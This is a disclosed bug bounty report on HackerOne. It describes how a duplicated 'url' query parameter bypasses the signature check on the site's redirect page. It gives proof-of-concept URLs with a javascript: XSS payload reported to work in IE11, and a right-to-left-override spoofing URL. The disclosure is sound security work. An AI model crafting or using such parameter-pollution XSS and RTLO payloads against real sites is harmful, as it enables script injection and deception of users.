# Query parameter reordering causes redirect page to render unsafe URL

## Report Details
- **Report ID**: 293689
- **URL**: https://hackerone.com/reports/293689
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-11-29T11:11:24.220Z
- **Disclosed**: 2017-11-30T06:09:18.879Z

## Reporter
- **Username**: kenziy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hello hackerone team

I want to report I bypass w/c lead to XSS (but limited only for IE) due to CSP block on chrome

Here is the POC
------------------
```
https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=JAVASCRIPT:alert%09(document.domain)
```

How I find this issue
-----------------------
First I notice that before you will redirect to other site hackerone will notify users that they are being redirected to other website
Here is example
------------------
```
https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me
```
But when you change the url it will not match to the signature (h1 alers) by you can bypass it by adding &url
so it would look like this
```
https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=
```
Now I try doing this to trigger XSS
```
https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=JAVASCRIPT:alert%09(document.domain)
```
due to CSP protection I was not able to trigger XSS (My bypass skills on CSP is not good enought :-( )
But in IE it works :-)

I beleive that this is an issue

Minor RTLO that can treak users
------------------------------------
And another things is I try to do a RTLO on the URL (But because it has filter alert I dont know if this will trigger your interest)
```
https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=http%3A%2F%2F%09%E2%80%AEmoc.enorekcah
```

Tested
-------
IE11 - for XSS
Chrome, Mozilla - for RTLO


Advance Merry Christmas guys :-)

Cheers
Kenziy

## Impact

Trick user or trigger malicious script

## Attachments
- xss.png
- RTLO.png
